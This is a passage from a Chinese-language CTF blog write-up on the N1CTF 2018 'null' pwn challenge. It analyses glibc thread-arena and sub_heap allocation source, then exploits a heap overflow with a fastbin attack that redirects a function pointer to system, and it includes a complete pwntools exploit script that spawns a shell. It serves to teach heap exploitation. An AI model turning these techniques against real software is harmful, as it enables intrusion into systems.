av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>追踪sysmalloc代码，代码过长，截取非主分配区部分。当申请的堆小于mmap直接分配阈值，并且分配区是非主分配区时，首先尝试延长原有的heap长度（连续分配）；当长度不满足需求时，会重新分配一块sub_heap，并设置heap_info值，也就是利用mmap随机在内存中申请一块内存，这块内存位于刚刚分配的低地址位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">sysmalloc (INTERNAL_SIZE_T nb, mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">char</span> *old_end;                  <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> size;                      <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="keyword">char</span> *brk;                      <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> correction;                <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="keyword">char</span> *snd_brk;                  <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;   <span class="comment">/* its size */</span></span><br></pre></td></tr></table></figure>
<p>  size_t pagesize = GLRO (dl_pagesize);<br>  bool tried_mmap = false;</p>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<pre><code>     /*
        If have mmap, and the request size meets the mmap threshold, and
        the system supports mmap, and there are few enough currently
        allocated mmapped regions, try to directly map this request
        rather than expanding top.
      */

     if (av == NULL
         || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)
         &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))
       {
         ...
         }

     if (av != &amp;main_arena)
       {
         heap_info *old_heap, *heap;
         size_t old_heap_size;

         /* First try to extend the current heap. */
         old_heap = heap_for_ptr (old_top);
         old_heap_size = old_heap-&gt;size;
         if ((long) (MINSIZE + nb - old_size) &gt; 0
             &amp;&amp; grow_heap (old_heap, MINSIZE + nb - old_size) == 0)
           {
             av-&gt;system_mem += old_heap-&gt;size - old_heap_size;
             arena_mem += old_heap-&gt;size - old_heap_size;
             set_head (old_top, (((char *) old_heap + old_heap-&gt;size) - (char *) old_top)
                       | PREV_INUSE);
           }
         else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad)))
           {
             /* Use a newly allocated heap.  */
             heap-&gt;ar_ptr = av;
             heap-&gt;prev = old_heap;
             av-&gt;system_mem += heap-&gt;size;
             arena_mem += heap-&gt;size;
             /* Set up the new top.  */
             top (av) = chunk_at_offset (heap, sizeof (*heap));
             set_head (top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE);

             /* Setup fencepost and free the old top chunk with a multiple of
                MALLOC_ALIGNMENT in size. */
             /* The fencepost takes at least MINSIZE bytes, because it might
                become the top chunk again later.  Note that a footer is set
                up, too, although the chunk is marked in use. */
             old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;
             set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE);
             if (old_size &gt;= MINSIZE)
               {
                 set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);
                 set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));
                 set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);
                 _int_free (av, old_top, 1);
               }
             else
               {
                 set_head (old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);
                 set_foot (old_top, (old_size + 2 * SIZE_SZ));
               }
           }
         else if (!tried_mmap)
           /* We can at least try to use to mmap memory.  */
           goto try_mmap;
       }
     else     /* av == main_arena */
       {
       ...
       }
   }

   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">   至此，线程堆的初始化、扩展、sub_heap生成全部完成。</span><br><span class="line">    </span><br><span class="line">   ​</span><br><span class="line">    </span><br><span class="line">## 题目分析</span><br><span class="line">    </span><br><span class="line">题目逻辑很简单，主函数什么都没有，只开启了一个线程。</span><br><span class="line">    </span><br><span class="line">![](/img/n1ctf2018/2-1.png)</span><br><span class="line">    </span><br><span class="line">在线程中，实现了用户输入任意大小的堆块、个数进行填充，并且可以对最后一个堆块赋值。</span><br><span class="line">    </span><br><span class="line">![](/img/n1ctf2018/2-3.png)</span><br><span class="line">    </span><br><span class="line">![](/img/n1ctf2018/2-2.png)</span><br><span class="line">    </span><br><span class="line">## 漏洞利用</span><br><span class="line">    </span><br><span class="line">漏洞存在于赋值函数中，是一个堆溢出函数，可以溢出和堆块大小等长的堆块。</span><br><span class="line">    </span><br><span class="line">![](/img/n1ctf2018/2-4.png)</span><br><span class="line">    </span><br><span class="line">该程序不存在地址泄露，并且system的地址也已经给出。</span><br><span class="line">    </span><br><span class="line">利用方法是利用上述线程堆块分配的知识。</span><br><span class="line">    </span><br><span class="line">1. 首先将线程第一次分配的非主分配区填充满</span><br><span class="line">    </span><br><span class="line">2. 再次申请时，线程只能申请一个新的sub_heap，此时的sub_heap地址位于第一次申请的sub_heap低地址位置。</span><br><span class="line">    </span><br><span class="line">3. 再次将该sub_heap填充满，在最后一次填充时进行复制，由于存在堆溢出，则可以溢出覆盖非主分配区的malloc_state结构体（thread arena），此时的利用和覆盖了main_arena的利用方法一致。</span><br><span class="line">    </span><br><span class="line">4. 选择fastbin attack的方法进行攻击，将fastbin劫持到bss段上去，因为bss段上有一个函数指针，会在赋值后调用，将这个函数赋值为system，并将堆块起始覆盖为&apos;/bin/sh&apos;即可获得shell。</span><br><span class="line">    </span><br><span class="line">   **hint：**</span><br><span class="line">    </span><br><span class="line">   1. 一定要劫持大小为0x70的fastbin链，因为可以利用bss段起始位置的STDIO file指针。</span><br><span class="line">    </span><br><span class="line">     ，与第一题的利用相同，都是0x7f。</span><br><span class="line">    </span><br><span class="line">   2. 无法劫持top值达到任意分配，原因是无法过int_malloc最后的检测，感兴趣的同学可以踩踩这个坑。</span><br><span class="line">    </span><br><span class="line">   ​</span><br><span class="line">    </span><br><span class="line">## 解题脚本</span><br><span class="line">    </span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">debug = 1</span><br><span class="line">elf = ELF(&apos;./null&apos;)</span><br><span class="line">if debug:</span><br><span class="line">	p = process(&apos;./null&apos;)</span><br><span class="line">	libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">	context.log_level = &apos;debug&apos;</span><br><span class="line">else:</span><br><span class="line">	exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Enter secret password:&apos;)</span><br><span class="line">p.send(&apos;i\&apos;m ready for challenge\n&apos;)</span><br><span class="line">time.sleep(3)</span><br><span class="line">    </span><br><span class="line">for i in range(0,3):</span><br><span class="line">	p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">	p.sendline(str(0x4000))</span><br><span class="line">	p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">	p.sendline(str(1000-1))</span><br><span class="line">	p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">	p.sendline(&apos;0&apos;)</span><br><span class="line">    </span><br><span class="line">	p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">	p.sendline(str(0x4000))</span><br><span class="line">	p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">	p.sendline(str(1000-1))</span><br><span class="line">	p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">	p.sendline(&apos;0&apos;)</span><br><span class="line">    </span><br><span class="line">	p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">	p.sendline(str(0x4000))</span><br><span class="line">	p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">	p.sendline(str(1000))</span><br><span class="line">	p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">	p.sendline(&apos;0&apos;)</span><br><span class="line">    </span><br><span class="line">	p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">	p.sendline(str(0x4000))</span><br><span class="line">	p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">	p.sendline(str(1000-1))</span><br><span class="line">	p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">	p.sendline(&apos;0&apos;)</span><br><span class="line">    </span><br><span class="line">	p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">	p.sendline(str(0x4000))</span><br><span class="line">	p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">	p.sendline(str(90-1))</span><br><span class="line">	p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">	p.sendline(&apos;0&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x4000))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(1))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Input:&apos;)</span><br><span class="line">    </span><br><span class="line">p.send(&apos;/bin/sh\0&apos;+p64(0)*(2+4+2+8+3-1))</span><br><span class="line">padding = p64(0)*(0x4000/8-2-4-8-3) +p64(0)+ p64(0x11) + p64(0)*4 +p64(0) + p64(0)*5+p64(0x60201d)+ p64(0)*4 #p64(0x602028-4)</span><br><span class="line">print hex(len(padding))</span><br><span class="line">p.send(padding)</span><br><span class="line">#gdb.attach(p,&apos;info threads&apos;)</span><br><span class="line">p.recvuntil(&apos;Action:&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Size:&apos;)</span><br><span class="line">p.sendline(str(0x60))</span><br><span class="line">p.recvuntil(&apos;blocks:&apos;)</span><br><span class="line">p.sendline(str(0))</span><br><span class="line">p.recvuntil(&apos;(0/1):&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;Input:&apos;)</span><br><span class="line">p.send(&apos;sh\0&apos;+p64(0)+p64(0x400978)+p64(0)*(0x60/8))</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


​

# 其他

1. 打完这次比赛，感觉和大佬们的差距无限大，还是要好好读书的。
2.  想到一个新的出题思路，既然程序的分配区是复用的，那么当一个程序的线程足够多的时候，主线程和某个线程所使用的分配区是一样的，在其他线程出现堆溢出的问题，同样可以影响主线程，比如如下的实验
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> num;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *a ;</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[%d] malloc address %p\n"</span>,num++,a);</span><br><span class="line">	sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">pthread_t</span> tid[<span class="number">40</span>];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">void</span> * ret;</span><br><span class="line">	<span class="keyword">char</span> *a;</span><br><span class="line">  	num = <span class="number">0</span>;</span><br><span class="line">  	setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"this is a test for thread arena! %d\n"</span>,num);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">33</span>;i++)&#123;</span><br><span class="line">		pthread_create(&amp;tid[i],<span class="literal">NULL</span>,thread_func,<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] main malloc address %p\n"</span>,a);</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i&lt;<span class="number">33</span>;i++)&#123;</span><br><span class="line">		<span class="comment">//pthread_create(&amp;tid[i],NULL,thread_func,NULL);</span></span><br><span class="line">		pthread_join(tid[i],<span class="number">0</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">	sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/img/n1ctf2018/3.png" alt=""></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2018/03/15/n1ctf2018/">N1CTF 2018 &amp;&amp; 线程堆知识源代码分析</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
        <p><span>发布时间:</span>2018-03-15, 21:40:25</p>
        <p><span>最后更新:</span>2018-07-05, 21:43:01</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/03/15/n1ctf2018/" title="N1CTF 2018 &amp;&amp; 线程堆知识源代码分析">http://p4nda.top/2018/03/15/n1ctf2018/</a>
            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/03/15/n1ctf2018/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2018/03/20/tcache/">
                    tcache 源码分析及利用思路
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2018/03/06/hgame/">
                    HGAME 2018 PWN题记录
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vote"><span class="toc-number">1.</span> <span class="toc-text">vote</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#地址泄露"><span class="toc-number">1.2.1.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastbin劫持"><span class="toc-number">1.2.2.</span> <span class="toc-text">Fastbin劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题脚本"><span class="toc-number">1.2.3.</span> <span class="toc-text">解题脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">null</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#线程堆块分配"><span class="toc-number">3.</span> <span class="toc-text">线程堆块分配</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#名词解释"><span class="toc-number">3.0.1.</span> <span class="toc-text">名词解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据结构"><span class="toc-number">3.0.2.</span> <span class="toc-text">数据结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结构组织"><span class="toc-number">3.0.3.</span> <span class="toc-text">结构组织</span></a></li></ol></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"N1CTF 2018 && 线程堆知识源代码分析　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function(){
            this.page.url = 'http://p4nda.top/2018/03/15/n1ctf2018/';
            this.page.identifier = '2018/03/15/n1ctf2018/';
        };
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = '//p4nda.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <script> loadComment(); </script>

</section>


    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2018/03/20/tcache/" title="上一篇: tcache 源码分析及利用思路">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2018/03/06/hgame/" title="下一篇: HGAME 2018 PWN题记录">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/0ctf-baby/">【kernel pwn】0ctf 2018 final baby题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/ciscn2018-core/">【kernel pwn】CISCN 2018 CTF core题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/WCTF-2018/">【WCTF 2018】parrot_revenge 题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB CTF 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2017-2018 P4nda
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
